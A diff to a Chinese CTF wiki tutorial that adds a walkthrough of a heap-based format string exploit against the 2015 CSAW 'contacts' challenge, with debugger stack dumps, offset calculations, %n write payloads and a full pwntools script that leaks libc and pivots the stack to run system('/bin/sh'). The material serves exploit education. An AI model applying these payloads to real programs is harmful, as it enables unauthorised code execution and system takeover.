@@ -200,7 +200,7 @@ int get_file()
 - 确定格式化字符串参数偏移
 - 利用put@got获取put函数地址，进而获取对应的libc.so的版本，进而获取对应system函数地址。
 - 修改puts@got的内容为system的地址。
-- 执行system(“/bin/sh”)。
+- 当程序再次执行puts函数的时候，其实执行的是system函数。
 
 ### 漏洞利用程序
 
@@ -278,7 +278,7 @@ show_dir()
 sh.interactive()
 ```
 
-请注意
+注意
 
 - 我在获取puts函数地址时使用的偏移是8，这是因为我希望我输出的前4个字节就是puts函数的地址。其实格式化字符串的首地址的偏移是7。
 - 这里我利用了pwntools中的fmtstr_payload函数，比较方便获取我们希望得到的结果，有兴趣的可以查看官方文档尝试。比如这里fmtstr_payload(7, {puts_got: system_addr})的意思就是，我的格式化字符串的偏移是7，我希望在puts_got地址处写入system_addr地址。默认情况下是按照字节来写的。
@@ -461,7 +461,274 @@ sh.interactive()
 
 # 堆上的格式化字符串漏洞
 
-待补充。
+## 原理
+
+所谓堆上的格式化字符串指的是格式化字符串本身存储在堆上，这个主要增加了我们获取对应偏移的难度，而一般来说，该格式化字符串都是很有可能被复制到栈上的。
+
+## 例子
+
+这里我们以2015年CSAW中的contacts为例进行介绍。
+
+### 确定保护
+
+```shell
+➜  2015-CSAW-contacts git:(master) ✗ checksec contacts
+    Arch:     i386-32-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x8048000)
+```
+
+可以看出程序不仅开启了NX保护还开启了Canary。
+
+### 分析程序
+
+简单看看程序，发现程序正如名字所描述的，是一个联系人相关的程序，可以实现创建，修改，删除，打印联系人的信息。而再仔细阅读，可以发现在输入联系人信息的时候存在格式化字符串漏洞。
+
+```C
+int __cdecl PrintInfo(int a1, int a2, int a3, char *format)
+{
+  printf("\tName: %s\n", a1);
+  printf("\tLength %u\n", a2);
+  printf("\tPhone #: %s\n", a3);
+  printf("\tDescription: ");
+  return printf(format);
+}
+```
+
+仔细看看，可以发现这个format其实是指向堆中的。
+
+### 利用思路
+
+我们的基本目的是获取系统的shell，从而拿到flag。其实既然有格式化字符串漏洞，我们应该是可以通过劫持got表或者控制程序返回地址来控制程序流程。但是这里却不怎么可行。原因分别如下
+
+- 之所以不能够劫持got来控制程序流程，是因为我们发现对于程序中常见的可以对于我们给定的字符串输出的只有printf函数，我们只有选择它才可以构造/bin/sh让它执行system('/bin/sh')，但是printf函数在其他地方也均有用到，这样做会使得程序直接崩溃。
+- 其次，不能够直接控制程序返回地址来控制程序流程的是因为我们并没有一块可以直接执行的地址来存储我们的内容，同时利用格式化字符串来往栈上直接写入system_addr+'bbbb'+addr of '/bin/sh‘似乎并不现实。
+
+
+那么我们可以怎么做呢？我们还有之前在栈溢出讲的技巧，stack privot。而这里，我们可以控制的恰好是堆内存，所以我们可以把栈迁移到堆上去。这里我们通过leave指令来进行栈迁移，所以在迁移之前我们需要修改程序保存ebp的值为我们想要的值。 只有这样在执行leave指令的时候，esp才会成为我们想要的值。同时，因为我们是使用格式化字符串来进行修改，所以我们得知道保存ebp的地址为多少，而这时PrintInfo函数中存储ebp的地址每次都在变化，而我们也无法通过其他方法得知。但是，**程序中压入栈中的ebp值其实保存的是上一个函数的保存ebp值的地址**，所以我们可以修改其**上层函数的保存的ebp的值，即上上层函数（即main函数）的ebp数值**。这样当上层程序返回时，即实现了将栈迁移到堆的操作。
+
+基本思路如下
+
+- 首先获取system函数的地址
+  - 通过泄露某个libc函数的地址根据libc database确定。
+- 构造基本联系人描述为system_addr+'bbbb'+binsh_addr
+- 修改上层函数保存的ebp(即上上层函数的ebp)为**存储system_addr的地址-4**。
+- 当主程序返回时，会有如下操作
+  - move esp,ebp，将esp指向system_addr的地址-4
+  - pop ebp， 将esp指向system_addr
+  - ret，将eip指向system_addr，从而获取shell。
+
+### 获取相关地址与偏移
+
+这里我们主要是获取system函数地址、/bin/sh地址，栈上存储联系人描述的地址，以及PrintInfo函数的地址。
+
+首先，我们根据栈上存储的libc_start_main_ret地址(该地址是当main函数执行返回时会运行的函数)来获取system函数地址、/bin/sh地址。我们构造相应的联系人，然后选择输出联系人信息，并将断点下在printf处，并且一直运行到格式化字符串漏洞的printf函数处，如下
+
+```shell
+ → 0xf7e44670 <printf+0>       call   0xf7f1ab09 <__x86.get_pc_thunk.ax>
+   ↳  0xf7f1ab09 <__x86.get_pc_thunk.ax+0> mov    eax, DWORD PTR [esp]
+      0xf7f1ab0c <__x86.get_pc_thunk.ax+3> ret    
+      0xf7f1ab0d <__x86.get_pc_thunk.dx+0> mov    edx, DWORD PTR [esp]
+      0xf7f1ab10 <__x86.get_pc_thunk.dx+3> ret    
+───────────────────────────────────────────────────────────────────────────────────────[ stack ]────
+['0xffffccfc', 'l8']
+8
+0xffffccfc│+0x00: 0x08048c27  →   leave 	 ← $esp
+0xffffcd00│+0x04: 0x0804c420  →  "1234567"
+0xffffcd04│+0x08: 0x0804c410  →  "11111"
+0xffffcd08│+0x0c: 0xf7e5acab  →  <puts+11> add ebx, 0x152355
+0xffffcd0c│+0x10: 0x00000000
+0xffffcd10│+0x14: 0xf7fad000  →  0x001b1db0
+0xffffcd14│+0x18: 0xf7fad000  →  0x001b1db0
+0xffffcd18│+0x1c: 0xffffcd48  →  0xffffcd78  →  0x00000000	 ← $ebp
+──────────────────────────────────────────────────────────────────────────────────────────[ trace ]────
+[#0] 0xf7e44670 → Name: __printf(format=0x804c420 "1234567\n")
+[#1] 0x8048c27 → leave 
+[#2] 0x8048c99 → add DWORD PTR [ebp-0xc], 0x1
+[#3] 0x80487a2 → jmp 0x80487b3
+[#4] 0xf7e13637 → Name: __libc_start_main(main=0x80486bd, argc=0x1, argv=0xffffce14, init=0x8048df0, fini=0x8048e60, rtld_fini=0xf7fe88a0 <_dl_fini>, stack_end=0xffffce0c)
+[#5] 0x80485e1 → hlt 
+────────────────────────────────────────────────────────────────────────────────────────────────────
+gef➤  dereference $esp 140
+['$esp', '140']
+1
+0xffffccfc│+0x00: 0x08048c27  →   leave 	 ← $esp
+gef➤  dereference $esp l140
+['$esp', 'l140']
+140
+0xffffccfc│+0x00: 0x08048c27  →   leave 	 ← $esp
+0xffffcd00│+0x04: 0x0804c420  →  "1234567"
+0xffffcd04│+0x08: 0x0804c410  →  "11111"
+0xffffcd08│+0x0c: 0xf7e5acab  →  <puts+11> add ebx, 0x152355
+0xffffcd0c│+0x10: 0x00000000
+0xffffcd10│+0x14: 0xf7fad000  →  0x001b1db0
+0xffffcd14│+0x18: 0xf7fad000  →  0x001b1db0
+0xffffcd18│+0x1c: 0xffffcd48  →  0xffffcd78  →  0x00000000	 ← $ebp
+0xffffcd1c│+0x20: 0x08048c99  →   add DWORD PTR [ebp-0xc], 0x1
+0xffffcd20│+0x24: 0x0804b0a8  →  "11111"
+0xffffcd24│+0x28: 0x00002b67 ("g+"?)
+0xffffcd28│+0x2c: 0x0804c410  →  "11111"
+0xffffcd2c│+0x30: 0x0804c420  →  "1234567"
+0xffffcd30│+0x34: 0xf7fadd60  →  0xfbad2887
+0xffffcd34│+0x38: 0x08048ed6  →  0x25007325 ("%s"?)
+0xffffcd38│+0x3c: 0x0804b0a0  →  0x0804c420  →  "1234567"
+0xffffcd3c│+0x40: 0x00000000
+0xffffcd40│+0x44: 0xf7fad000  →  0x001b1db0
+0xffffcd44│+0x48: 0x00000000
+0xffffcd48│+0x4c: 0xffffcd78  →  0x00000000
+0xffffcd4c│+0x50: 0x080487a2  →   jmp 0x80487b3
+0xffffcd50│+0x54: 0x0804b0a0  →  0x0804c420  →  "1234567"
+0xffffcd54│+0x58: 0xffffcd68  →  0x00000004
+0xffffcd58│+0x5c: 0x00000050 ("P"?)
+0xffffcd5c│+0x60: 0x00000000
+0xffffcd60│+0x64: 0xf7fad3dc  →  0xf7fae1e0  →  0x00000000
+0xffffcd64│+0x68: 0x08048288  →  0x00000082
+0xffffcd68│+0x6c: 0x00000004
+0xffffcd6c│+0x70: 0x0000000a
+0xffffcd70│+0x74: 0xf7fad000  →  0x001b1db0
+0xffffcd74│+0x78: 0xf7fad000  →  0x001b1db0
+0xffffcd78│+0x7c: 0x00000000
+0xffffcd7c│+0x80: 0xf7e13637  →  <__libc_start_main+247> add esp, 0x10
+0xffffcd80│+0x84: 0x00000001
+0xffffcd84│+0x88: 0xffffce14  →  0xffffd00d  →  "/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/fmtstr/example/201[...]"
+0xffffcd88│+0x8c: 0xffffce1c  →  0xffffd058  →  "XDG_SEAT_PATH=/org/freedesktop/DisplayManager/Seat[...]"
+```
+
+我们可以通过简单的判断可以得到
+
+```
+0xffffcd7c│+0x80: 0xf7e13637  →  <__libc_start_main+247> add esp, 0x10
+```
+
+存储的就是main相应的地址，同时利用fmtarg来获取对应的偏移，可以看出其偏移为32，那么相对于格式化字符串的偏移为31。
+
+```shell
+gef➤  fmtarg 0xffffcd7c
+The index of format argument : 32
+```
+
+这样我们便可以得到对应的地址了。进而可以根据libc-database来获取对应的libc，继而获取system函数地址与/bin/sh函数地址了。
+
+其次，我们可以确定栈上存储格式化字符串的地址0xffffcd2c相对于格式化字符串的偏移为6，得到这个是为了构造我们的联系人。
+
+再者，我们可以看出下面的地址保存着上层函数的调用地址，其相对于格式化字符串的偏移为11，这样我们可以直接修改上层函数存储的ebp的值。
+
+```shell
+0xffffcd18│+0x1c: 0xffffcd48  →  0xffffcd78  →  0x00000000	 ← $ebp
+```
+
+### 构造联系人获取堆地址
+
+得知上面的信息后，我们可以利用下面的方式获取堆地址与相应的ebp地址。
+
+```text
+[system_addr][bbbb][binsh_addr][%6$p][%11$p][bbbb]
+```
+
+来获取对应的相应的地址。后面的bbbb是为了接受字符串方便。
+
+这里因为函数调用时所申请的栈空间与释放的空间是一致的，所以我们得到的ebp地址并不会因为我们再次调用而改变。
+
+### 修改ebp
+
+由于我们需要执行move指令将ebp赋给esp，并还需要执行pop ebp才会执行ret指令，所以我们需要将ebp修改为存储system地址-4的值。这样pop ebp之后，esp恰好指向保存system的地址，这时在执行ret指令即可执行system函数。
+
+上面已经得知了我们希望修改的ebp值，而也知道了对应的偏移为11，所以我们可以构造如下的payload来进行修改相应的值。
+
+```
+part1 = (heap_addr - 4) / 2
+part2 = heap_addr - 4 - part1
+payload = '%' + str(part1) + 'x%' + str(part2) + 'x%6$n'
+```
+
+### 获取shell
+
+这时，执行完格式化字符串函数之后，退出到上上函数，我们输入5，退出程序即会执行ret指令，就可以获取shell。
+
+### 利用程序
+
+```python
+from pwn import *
+from LibcSearcher import *
+contact = ELF('./contacts')
+#context.log_level = 'debug'
+if args['REMOTE']:
+    sh = remote(11, 111)
+else:
+    sh = process('./contacts')
+
+
+def createcontact(name, phone, descrip_len, description):
+    sh.recvuntil('>>> ')
+    sh.sendline('1')
+    sh.recvuntil('Contact info: \n')
+    sh.recvuntil('Name: ')
+    sh.sendline(name)
+    sh.recvuntil('You have 10 numbers\n')
+    sh.sendline(phone)
+    sh.recvuntil('Length of description: ')
+    sh.sendline(descrip_len)
+    sh.recvuntil('description:\n\t\t')
+    sh.sendline(description)
+
+
+def printcontact():
+    sh.recvuntil('>>> ')
+    sh.sendline('4')
+    sh.recvuntil('Contacts:')
+    sh.recvuntil('Description: ')
+
+
+# get system addr & binsh_addr
+payload = '%31$paaaa'
+createcontact('1111', '1111', '111', payload)
+printcontact()
+libc_start_main_ret = int(sh.recvuntil('aaaa', drop=True), 16)
+log.success('get libc_start_main_ret addr: ' + hex(libc_start_main_ret))
+libc = LibcSearcher('__libc_start_main_ret', libc_start_main_ret)
+libc_base = libc_start_main_ret - libc.dump('__libc_start_main_ret')
+system_addr = libc_base + libc.dump('system')
+binsh_addr = libc_base + libc.dump('str_bin_sh')
+log.success('get system addr: ' + hex(system_addr))
+log.success('get binsh addr: ' + hex(binsh_addr))
+#gdb.attach(sh)
+
+# get heap addr and ebp addr
+payload = flat([
+    system_addr,
+    'bbbb',
+    binsh_addr,
+    '%6$p%11$pcccc',
+])
+createcontact('2222', '2222', '222', payload)
+printcontact()
+sh.recvuntil('Description: ')
+data = sh.recvuntil('cccc', drop=True)
+data = data.split('0x')
+print data
+ebp_addr = int(data[1], 16)
+heap_addr = int(data[2], 16)
+
+# modify ebp
+part1 = (heap_addr - 4) / 2
+part2 = heap_addr - 4 - part1
+payload = '%' + str(part1) + 'x%' + str(part2) + 'x%6$n'
+#print payload
+createcontact('3333', '123456789', '300', payload)
+printcontact()
+sh.recvuntil('Description: ')
+sh.recvuntil('Description: ')
+#gdb.attach(sh)
+print 'get shell'
+sh.recvuntil('>>> ')
+#get shell
+sh.sendline('5')
+sh.interactive()
+```
+
+需要注意的是，这样并不能稳定得到shell，因为我们一次性输入了太长的字符串。但是我们又没有办法在前面控制所想要输入的地址。只能这样了。
 
 # 格式化字符串盲打
 
